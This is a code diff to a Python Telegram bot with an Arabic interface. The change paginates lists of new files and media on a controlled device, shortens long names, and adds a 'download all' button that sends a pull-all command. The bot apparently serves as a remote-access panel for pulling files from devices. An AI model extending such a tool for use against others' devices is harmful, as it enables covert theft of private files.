@@ -869,13 +869,23 @@ def _format_new_files_result(dev, new_data):
         kb.add(InlineKeyboardButton("🔙 رجوع", callback_data=_cb(did, "newfiles", "menu")))
         return text, kb
 
+    # ⚡ V11.2.63: تحديد 20 ملف لكل صفحة (لتجنب 'reply markup too long')
+    MAX_FILES_PER_PAGE = 20
+    total_files = len(files)
+    displayed_files = files[:MAX_FILES_PER_PAGE]
+    remaining = total_files - len(displayed_files)
+
     file_count = 0
-    for f in files:
+    for f in displayed_files:
         name = f.get("name", "?")
         path = f.get("path", "")
         size = f.get("size", 0)
         ftype = f.get("type", "FILE")
         source = f.get("source", "")
+
+        # ⚡ V11.2.63: اختصار اسم الملف لو طويل
+        if len(name) > 40:
+            name = name[:37] + "..."
 
         size_str = ""
         if size > 1024 * 1024:
@@ -906,7 +916,8 @@ def _format_new_files_result(dev, new_data):
         f"🆕 <b>{type_label}</b>\n\n"
         f"📱 <b>{short_label}</b>\n"
         f"━━━━━━━━━━━━━━━\n"
-        f"📊 عدد الملفات: {file_count}\n\n"
+        f"📊 عدد الملفات: {total_files}\n"
+        f"📄 المعروض: {file_count}" + (f" (+{remaining} متبقي)" if remaining > 0 else "") + "\n\n"
         f"💡 اضغط على ملف لسحبه\n"
         f"💡 الملفات المسحوبة تختفي تلقائياً"
     )
@@ -959,12 +970,22 @@ def _format_media_list_result(dev, media_data):
         kb.add(_back(did))
         return text, kb
 
+    # ⚡ V11.2.63: تحديد 20 ملف لكل صفحة (لتجنب 'reply markup too long')
+    MAX_FILES_PER_PAGE = 20
+    total_files = len(files)
+    displayed_files = files[:MAX_FILES_PER_PAGE]
+    remaining = total_files - len(displayed_files)
+
     # Add file buttons
     file_count = 0
-    for f in files:
+    for f in displayed_files:
         name = f.get("name", "?")
         uri = f.get("uri", "")
         size = f.get("size", 0)
+
+        # ⚡ V11.2.63: اختصار اسم الملف لو طويل
+        if len(name) > 40:
+            name = name[:37] + "..."
 
         size_str = ""
         if size > 1024 * 1024:
@@ -990,14 +1011,23 @@ def _format_media_list_result(dev, media_data):
         ))
         file_count += 1
 
+    # ⚡ V11.2.63: زر "تحميل الكل" لو بقايا ملفات
+    if remaining > 0:
+        kb.add(InlineKeyboardButton(
+            f"📥 تحميل الكل ({total_files} ملف)",
+            callback_data=_cb(did, "cmd", f"pull-all-{media_type}")
+        ))
+
     kb.add(_back(did))
 
     text = (
         f"📂 <b>{type_label}</b>\n\n"
         f"📱 <b>{short_label}</b>\n"
         f"━━━━━━━━━━━━━━━\n"
-        f"📊 عدد الملفات: {file_count}\n\n"
-        f"💡 اضغط على أي ملف لتحميله"
+        f"📊 عدد الملفات: {total_files}\n"
+        f"📄 المعروض: {file_count}" + (f" (+{remaining} متبقي)" if remaining > 0 else "") + "\n\n"
+        f"💡 اضغط على أي ملف لتحميله\n"
+        + ("💡 أو اضغط 'تحميل الكل' لسحب الجميع" if remaining > 0 else "")
     )
 
     return text, kb
